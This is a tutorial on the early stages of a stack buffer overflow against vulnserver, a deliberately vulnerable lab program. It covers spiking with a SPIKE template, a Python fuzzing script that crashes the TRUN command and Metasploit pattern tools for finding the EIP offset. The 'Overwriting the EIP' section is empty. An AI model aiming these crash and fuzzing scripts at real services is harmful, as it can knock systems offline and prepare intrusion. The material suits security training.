# Exploit Development

## Index

- [Required installation](#Required-installations)
- [Spiking](#Spiking)
- [Fuzzing](#Fuzzing)
- [Fiding the Offset](#Finding-the-offset)
- [Overwriting the EIP](#Overwriting-the-EIP)



## Required installations

You need to downaload **vulnserver** (.zip) and **immunity debugger**. IF you don't have Python 2.7, you can install it during the execution of **ID**

Go to the immunity debugger and click on `file` --> `attached` --> find your file `vulnserver.exe`

The vulnserver is listenning by default on port 9999.

## Spiking

Spiking is the process to find a way to crash the machine, the program send somes characteres randomly and hope find a breach.
It's just looking for something to break the program.

You can connect with netcat on the machine who run the backdoor (`vulnserver.exe`). --> `nc -nv <victim_ip> <port(default : 9999)>`

Or with the command `generic_send_tcp` --> `genreric_send_tcp <target_ip> <port(default : 9999)> <file>.spk 0 0`

We try with **immunity debugger** so the program will not crash but if we send all kind of file.spk like that :

```
_readline();
s_string("TRUN ");
s_string_variable("0");

```
The immunity debugger is paused and vulnserver not crashed. We see the ESP (*Extended Stack Pointer*) with lot's of characters.
The same character is present multiple times (in hexadecimal form) in the EBP (*Extended Base Pointer*) and the **EIP** (*Extended Instruction Pointer**) 
The **EIP** is the most interesting because it's here that we can execute some malicious code.

We can just replace "TRUN " by "STATS " or other word defined when you did the `nc` command.
For some file, it will not crash, but for some it will crash.
In our example, `trun` command is vulnerable so we keep this example until the end.

## Fuzzing

The fuzzing is similar to spiking because we are going to be sending bunch of random character at a specific command and trying to break it.

The difference is fuzzing appears after you know which command is vulnerable.
 
We try to know where the program crashed, how many bytes we can send in order to crash the program. We can do this with a python script : 

```
#!/usr/bin/python
import socket, sys
from time import sleep

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<victim_ip>', <port(default : 9999)>))
	
		s.send(('TRUN /.:/' + buffer))					| <-- the "/.:/" is required for the program in order to understand
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100					| <-- the buffer is icrementing with hundred of "A" each time 

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))		| <-- we print the length of the buffer when the program crashed (how many bytes). 
		sys.exit() 

```
You can see the **immunity debugger** is paused, you can ^C the program .py and see at *how many bites* the program crashed.

## Finding the Offset

Finding the offset means finding where we overwrite the EIP because that's what we want to control.
When we have the number of bytes aproximatively, we have to create a new buffer, we call it the offset, with a tool in metasploit framework.

Create this pattern --> `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <python_script_result>`
This command generate a string and you can modify the python script.

``` 
#!/usr/bin/python
import socket, sys

offset = "<pattern>"								| <-- paste the result pattern of the metasploit tool

while True: 
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
                s.send(('TRUN /.:/' + offset))
                s.close()
        except:   
                print "Error connecting to server"
                sys.exit()

```
The program crashed and you need to know where, so we use another metasploit tool.
--> `usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <same_value_as_we_created> -q <EIP_value_in_immunity_debugger>`
--> It gives you the exact offset match with the number of bytes. At this number of bytes, we can control the EIP.

## Overwriting the EIP



 
